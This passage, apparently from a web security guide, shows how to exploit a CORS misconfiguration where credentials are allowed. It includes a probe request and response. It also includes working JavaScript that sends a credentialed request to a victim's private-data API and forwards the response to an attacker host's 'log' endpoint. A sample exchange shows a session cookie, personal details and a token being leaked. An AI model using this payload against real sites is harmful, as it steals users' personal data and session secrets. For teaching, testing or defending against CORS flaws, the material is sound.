#### Leaking User Data
When `Access-Control-Allow-Credentials` is set to True, the basic technique to take advantage of this CORS configuration flaw is to create a JavaScript script to send CORS requests, as follows:
Your send    
```
GET /handler_to_test HTTP/1.1
Host: target.domain
Origin: https://attaker.domain
Connection: close
```
Server return message    
```
HTTP/1.1 200 OK
…
Access-control-allow-credentials: true
Access-control-allow-origin: https://attacker.domain
…
```
Javascript to send to CORS requests    
```
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open(“get”,”https://vulnerable.domain/api/private-data”,true);
req.withCredentials = true;
req.send();
function reqListener() {
location=”//attacker.domain/log?response=”+this.responseText;
};
```
With this code, you can steal user data through a defective `log` interface.
When the victim with the user credentials of the target system visits the page with the above code, the browser sends the following request to the `vulnerable server`    
```
GET /api/private-data HTTP/1.1
Host: vulnerable.domain
Origin: https://attacker.domain/
Cookie: JSESSIONID=<redacted>
```
Then you will receive the following return data    
```
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Access-Control-Allow-Origin: https://attacker.domain
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: Access-Control-Allow-Origin,Access-Control-Allow-Credentials
Vary: Origin
Expires: Thu, 01 Jan 1970 12:00:00 GMT
Last-Modified: Wed, 02 May 2018 09:07:07 GMT
Cache-Control: no-store, no-cache, must-revalidate, max-age=0, post-check=0, pre-check=0
Pragma: no-cache
Content-Type: application/json;charset=ISO-8859-1
Date: Wed, 02 May 2018 09:07:07 GMT
Connection: close
Content-Length: 149
{"id":1234567,"name":"Name","surname":"Surname","email":"email@target.local","account":"ACT1234567","balance":"123456,7","token":"to
p-secret-string"}
```   
